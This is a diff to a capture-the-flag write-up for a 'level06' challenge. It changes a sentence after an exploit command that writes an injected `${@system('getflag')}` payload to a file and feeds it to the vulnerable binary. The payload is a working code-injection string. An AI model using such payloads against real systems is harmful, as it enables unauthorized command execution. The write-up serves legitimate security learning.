@@ -10,4 +10,4 @@ The home directory contains 2 files:
 after some fiddling around, we got to this command:
 `echo '[x ${@system('getflag')}]' > /run/shm/wow; ./level06 /run/shm/wow`
 
-which puts up an error and interprets our `system('getflag')` and prints the levels flag
+which puts up an error and interprets our `system('getflag')` and prints the level flag, we can now login as `level07`
